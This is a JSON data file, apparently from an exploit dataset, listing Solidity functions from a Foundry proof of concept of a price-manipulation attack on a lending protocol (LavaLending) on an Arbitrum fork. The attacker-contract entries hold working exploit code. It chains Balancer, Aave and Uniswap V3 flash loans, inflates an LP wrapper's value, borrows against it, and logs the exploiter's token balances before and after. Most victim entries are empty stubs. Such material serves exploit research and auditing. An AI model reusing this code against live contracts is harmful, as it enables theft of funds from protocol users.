[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "executeOperation",
    "original_code": "    function executeOperation(\n        address[] calldata assets,\n        uint256[] calldata amounts,\n        uint256[] calldata premiums,\n        address initiator,\n        bytes calldata params\n    ) external returns (bool) {\n        // Flashloan USDCe\n        uint256 amountUSDCe = specifiedUSDCeAmount - USDCe.balanceOf(address(this));\n        WETH_USDCe.flash(address(this), 0, amountUSDCe, abi.encode(uint256(amountUSDCe), uint8(2)));\n        USDC.approve(address(AaveFlashloan), amounts[0] + premiums[0]);\n        USDCe.approve(address(AaveFlashloan), amounts[1] + premiums[1]);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "receiveFlashLoan",
    "original_code": "    function receiveFlashLoan(\n        address[] calldata tokens,\n        uint256[] calldata amounts,\n        uint256[] calldata feeAmounts,\n        bytes calldata userData\n    ) external {\n        // amount1=1 because Pair USDC balance is greater than specific value from attack contract (storage 19)\n        WETH_USDC.flash(address(this), 0, 1, abi.encode(uint256(1), uint8(1)));\n        WETH.transfer(address(BalancerVault), amounts[0]);\n        USDC.transfer(address(BalancerVault), amounts[1]);\n        USDCe.transfer(address(BalancerVault), amounts[2]);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"arbitrum\", 195_240_642);\n        vm.label(address(USDC), \"USDC\");\n        vm.label(address(USDCe), \"USDCe\");\n        vm.label(address(USDT), \"USDT\");\n        vm.label(address(WETH), \"WETH\");\n        vm.label(address(BalancerVault), \"BalancerVault\");\n        vm.label(address(USDC_USDC_LP), \"USDC_USDC_LP\");\n        vm.label(address(WETH_USDC), \"WETH_USDC\");\n        vm.label(address(WETH_USDCe), \"WETH_USDCe\");\n        vm.label(address(USDC_USDCe), \"USDC_USDCe\");\n        vm.label(address(AaveFlashloan), \"AaveFlashloan\");\n        vm.label(address(LendingPool), \"LendingPool\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        emit log_named_decimal_uint(\n            \"Exploiter USDCe balance before attack\", USDCe.balanceOf(address(this)), USDCe.decimals()\n        );\n\n        emit log_named_decimal_uint(\n            \"Exploiter wstEth balance before attack\", wstETH.balanceOf(address(this)), wstETH.decimals()\n        );\n\n        emit log_named_decimal_uint(\"Exploiter USDT balance before attack\", USDT.balanceOf(address(this)), 6);\n\n        emit log_named_decimal_uint(\n            \"Exploiter WETH balance before attack\", WETH.balanceOf(address(this)), WETH.decimals()\n        );\n\n        emit log_named_decimal_uint(\n            \"Exploiter USDC balance before attack\", USDC.balanceOf(address(this)), USDC.decimals()\n        );\n\n        uint256 amountWETH = calcWETHAmount();\n        address[] memory tokens = new address[](3);\n        tokens[0] = address(WETH);\n        tokens[1] = address(USDC);\n        tokens[2] = address(USDCe);\n\n        uint256[] memory amounts = new uint256[](3);\n        amounts[0] = amountWETH;\n        amounts[1] = USDC.balanceOf(address(BalancerVault));\n        amounts[2] = USDCe.balanceOf(address(BalancerVault));\n\n        BalancerVault.flashLoan(address(this), tokens, amounts, \"\");\n\n        emit log_named_decimal_uint(\n            \"Exploiter USDCe balance after attack\", USDCe.balanceOf(address(this)), USDCe.decimals()\n        );\n\n        emit log_named_decimal_uint(\n            \"Exploiter wstEth balance after attack\", wstETH.balanceOf(address(this)), wstETH.decimals()\n        );\n\n        emit log_named_decimal_uint(\"Exploiter USDT balance after attack\", USDT.balanceOf(address(this)), 6);\n\n        emit log_named_decimal_uint(\n            \"Exploiter WETH balance after attack\", WETH.balanceOf(address(this)), WETH.decimals()\n        );\n\n        emit log_named_decimal_uint(\n            \"Exploiter USDC balance after attack\", USDC.balanceOf(address(this)), USDC.decimals()\n        );\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "uniswapV3FlashCallback",
    "original_code": "    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {\n        (uint256 borrowedAmount, uint8 flashId) = abi.decode(data, (uint256, uint8));\n        if (flashId == 1) {\n            // Flashloan USDC\n            uint256 amountUSDC;\n            if (USDC.balanceOf(address(this)) < specifiedUSDCAmount) {\n                amountUSDC = specifiedUSDCAmount - USDC.balanceOf(address(this));\n            } else {\n                amountUSDC = 1;\n            }\n            address[] memory assets = new address[](2);\n            assets[0] = address(USDC);\n            assets[1] = address(USDCe);\n            uint256[] memory amounts = new uint256[](2);\n            amounts[0] = amountUSDC;\n            amounts[1] = 1;\n            uint256[] memory interestRateModes = new uint256[](2);\n            interestRateModes[0] = 0;\n            interestRateModes[1] = 0;\n\n            AaveFlashloan.flashLoan(address(this), assets, amounts, interestRateModes, address(this), \"\", 0);\n            USDC.transfer(address(WETH_USDC), 2);\n        } else if (flashId == 2) {\n            USDC.approve(address(USDC_USDC_LP), type(uint256).max);\n            USDCe.approve(address(USDC_USDC_LP), type(uint256).max);\n            USDC_USDC_LP.deposit(1e9, 1e9, 0, 0);\n            helper = new Helper();\n            WETH.transfer(address(helper), amountOfWETHToTransfer);\n            helper.depositAndBorrow();\n\n            int256 swapAmount = USDCeToUSDC();\n            USDC_USDC_LP.withdraw(USDC_USDC_LP.balanceOf(address(this)));\n\n            // First deposit to UniV3Wrapper\n            // Following two values are from raw hex values (no calculations found)\n            uint256 amount0 = 2_699_999_999_117;\n            uint256 amount1 = 2_700_269_999_117;\n            uint256 startingAmount0_1 = amount0 * ((1e18 * valueForCalcDepositAmount) / (amount0 + amount1));\n            uint256 startingAmount1_1 = amount1 * ((1e18 * valueForCalcDepositAmount) / (amount0 + amount1));\n            USDC_USDC_LP.deposit(startingAmount0_1 / 1e18, startingAmount1_1 / 1e18, 0, 0);\n            // Second deposit to UniV3Wrapper\n            uint256 startingAmount0_2 = 20 * (startingAmount0_1 / 1e18);\n            uint256 startingAmount1_2 = 20 * (startingAmount1_1 / 1e18);\n            (, uint256 sharesMinted) = USDC_USDC_LP.deposit(startingAmount0_2 / 1000, startingAmount1_2 / 1000, 0, 0);\n            USDC_USDC_LP.approve(address(LendingPool), type(uint256).max);\n            WETH.approve(address(LendingPool), type(uint256).max);\n\n            // Third deposit to Lending Pool\n            LendingPool.deposit(address(WETH), WETH.balanceOf(address(this)), address(this), 0);\n            // Fourth deposit to Lending Pool\n            LendingPool.deposit(\n                address(USDC_USDC_LP), USDC_USDC_LP.balanceOf(address(this)) - sharesMinted, address(this), 0\n            );\n\n            borrower = new Borrower();\n            ausdcUsdcLP.transfer(address(borrower), ausdcUsdcLP.balanceOf(address(this)));\n            LendingPool.borrow(address(USDC_USDC_LP), USDC_USDC_LP.balanceOf(address(ausdcUsdcLP)), 2, 0, address(this));\n            USDC_USDC_LP.withdraw(USDC_USDC_LP.balanceOf(address(this)));\n            USDC_USDCe.flash(address(this), 1_000_000, 0, abi.encode(uint256(1_000_000), uint8(3)));\n\n            borrower.borrow();\n            USDCToUSDCe(swapAmount);\n            USDCe.transfer(address(WETH_USDCe), borrowedAmount + fee1);\n        } else if (flashId == 3) {\n            USDC.transfer(address(USDC_USDCe), 26_001_000_000);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "uniswapV3SwapCallback",
    "original_code": "    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {\n        if (amount0Delta > 0) {\n            USDC.transfer(address(USDC_USDCe), uint256(amount0Delta));\n        } else {\n            USDCe.transfer(address(USDC_USDCe), uint256(amount1Delta));\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "LavaLending_exp",
    "source_type": "attacker_contract",
    "function_name": "testPoC",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "AttackerC",
    "source_type": "victim_contract",
    "function_name": "algebraFlashCallback",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "AttackerC",
    "source_type": "victim_contract",
    "function_name": "algebraSwapCallback",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "AttackerC",
    "source_type": "victim_contract",
    "function_name": "attack",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILendingPoolProxy",
    "source_type": "victim_contract",
    "function_name": "borrow",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILendingPoolProxy",
    "source_type": "victim_contract",
    "function_name": "deposit",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IFS",
    "source_type": "victim_contract",
    "function_name": "allowance",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IFS",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IFS",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IFS",
    "source_type": "victim_contract",
    "function_name": "compound",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IFS",
    "source_type": "victim_contract",
    "function_name": "decimals",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IFS",
    "source_type": "victim_contract",
    "function_name": "exactOutputSingle",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IFS",
    "source_type": "victim_contract",
    "function_name": "flash",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IFS",
    "source_type": "victim_contract",
    "function_name": "flashLoan",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IFS",
    "source_type": "victim_contract",
    "function_name": "getAssetPrice",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IFS",
    "source_type": "victim_contract",
    "function_name": "getUserAccountData",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IFS",
    "source_type": "victim_contract",
    "function_name": "name",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IFS",
    "source_type": "victim_contract",
    "function_name": "owner",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IFS",
    "source_type": "victim_contract",
    "function_name": "swap",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IFS",
    "source_type": "victim_contract",
    "function_name": "symbol",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IFS",
    "source_type": "victim_contract",
    "function_name": "totalSupply",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IFS",
    "source_type": "victim_contract",
    "function_name": "transfer",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IFS",
    "source_type": "victim_contract",
    "function_name": "transferFrom",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IFS",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Helper",
    "source_type": "attacker_contract",
    "function_name": "depositAndBorrow",
    "original_code": "    function depositAndBorrow() external {\n        WETH.approve(address(LendingPool), type(uint256).max);\n        LendingPool.deposit(address(WETH), WETH.balanceOf(address(this)), address(this), 0);\n\n        uint256 amount = (USDC_USDC_LP.balanceOf(ausdcUsdcLP) * 99) / 100;\n        LendingPool.borrow(address(USDC_USDC_LP), amount, 2, 0, address(this));\n        USDC_USDC_LP.transfer(msg.sender, amount);\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "IUniV3Wrapper",
    "source_type": "victim_contract",
    "function_name": "getAssets",
    "original_code": "",
    "description": ""
  }
]